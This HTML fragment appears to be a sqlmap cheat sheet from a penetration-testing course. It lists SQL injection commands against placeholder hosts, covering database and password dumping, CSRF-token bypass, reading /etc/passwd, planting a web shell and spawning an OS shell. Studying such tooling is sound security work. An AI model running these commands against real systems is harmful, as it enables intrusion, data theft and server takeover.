<div class="text-center text-break">
<h5><i class="fad fa-file-alt"></i>&nbsp; Cheat Sheet</h5>
<p>The cheat sheet is a useful command reference for this module.</p>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sqlmap -h</code></td>
<td>View the basic help menu</td>
</tr>
<tr>
<td><code>sqlmap -hh</code></td>
<td>View the advanced help menu</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/vuln.php?id=1" --batch</code></td>
<td>Run <code>SQLMap</code> without asking for user input</td>
</tr>
<tr>
<td><code>sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</code></td>
<td><code>SQLMap</code> with POST request</td>
</tr>
<tr>
<td><code>sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</code></td>
<td>POST request specifying an injection point with an asterisk</td>
</tr>
<tr>
<td><code>sqlmap -r req.txt</code></td>
<td>Passing an HTTP request file to <code>SQLMap</code></td>
</tr>
<tr>
<td><code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code></td>
<td>Specifying a cookie header</td>
</tr>
<tr>
<td><code>sqlmap -u www.target.com --data='id=1' --method PUT</code></td>
<td>Specifying a PUT request</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt</code></td>
<td>Store traffic to an output file</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch</code></td>
<td>Specify verbosity level</td>
</tr>
<tr>
<td><code>sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"</code></td>
<td>Specifying a prefix or suffix</td>
</tr>
<tr>
<td><code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code></td>
<td>Specifying the level and risk</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba</code></td>
<td>Basic DB enumeration</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --tables -D testdb</code></td>
<td>Table enumeration</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname</code></td>
<td>Table/row enumeration</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</code></td>
<td>Conditional enumeration</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --schema</code></td>
<td>Database schema enumeration</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --search -T user</code></td>
<td>Searching for data</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --passwords --batch</code></td>
<td>Password enumeration and cracking</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/" --data="id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"</code></td>
<td>Anti-CSRF token bypass</td>
</tr>
<tr>
<td><code>sqlmap --list-tampers</code></td>
<td>List all tamper scripts</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba</code></td>
<td>Check for DBA privileges</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"</code></td>
<td>Reading a local file</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</code></td>
<td>Writing a file</td>
</tr>
<tr>
<td><code>sqlmap -u "http://www.example.com/?id=1" --os-shell</code></td>
<td>Spawning an OS shell</td>
</tr>
</tbody>
</table></div>
</div>
